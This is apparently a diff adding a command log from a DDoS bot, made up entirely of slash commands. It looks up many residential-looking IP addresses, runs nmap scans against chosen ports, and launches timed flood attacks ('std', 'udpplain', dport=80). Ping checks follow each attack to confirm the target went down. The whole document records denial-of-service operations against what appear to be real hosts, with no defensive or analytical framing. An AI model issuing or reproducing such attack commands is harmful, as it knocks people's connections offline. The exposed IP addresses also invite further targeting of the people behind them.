@@ -1,0 +1,59 @@
+/tr4p
+/checkip 68.5.56.120
+/checkip 99.183.235.211
+/checkip 73.211.234.231
+/checkip 73.208.73.220
+/checkip 24.168.69.121
+/checkip 24.90.230.243
+/checkip 68.199.195.240
+/checkip 67.173.86.197
+/checkip 162.238.195.40
+/checkip 69.246.197.37
+/checkip 24.192.80.30
+/checkip 55995
+/checkip 98.213.91.126
+/tr4p
+/ping 98.213.91.126
+/checkip 73.45.54.191
+/nmapsv 73.45.54.191 59334
+/nmapresult
+/nmapsv 69.246.197.37 63795
+/nmapresult
+/nmap 69.246.197.37 63795
+/nmapresult
+/checkip 73.111.29.252
+/ddos std 73.111.29.252 1200
+/ping 73.111.29.252
+/ping 73.111.29.252
+/checkip 73.8.115.228
+/ddos udpplain 73.8.115.228 700
+/ping 73.8.115.228
+/ping 73.8.115.228
+/checkip 173.21.70.122
+/ping 173.21.70.122
+/checkip 73.51.242.201
+/checkip 69.47.212.54
+/ping 69.47.212.54
+/checkip 173.29.27.75
+/checkip 71.192.236.224
+/checkip 173.29.27.75
+/checkip 173.21.71.166
+/checkip 73.51.242.201
+/ping 24.26.55.61
+/ddos std 24.26.55.61 1200 dport=80
+/ddos std 24.26.55.61 300
+/ping 24.26.55.61
+/ping 24.26.55.61
+/ping 24.26.55.61
+/ping 24.26.55.61
+/ping 24.26.55.61
+/ddos std 67.190.45.43 300 dport=80
+/ddos std 174.56.103.233 500 dport=80
+/ping 174.56.103.233
+/ping 67.190.45.43
+/ping 67.190.45.43
+/ping 67.190.45.43
+/ping 190.68.22.129
+/ddos std 190.68.22.129 1200 dport=80
+/checkip 162.238.192.243
+/ping 69.245.245.37
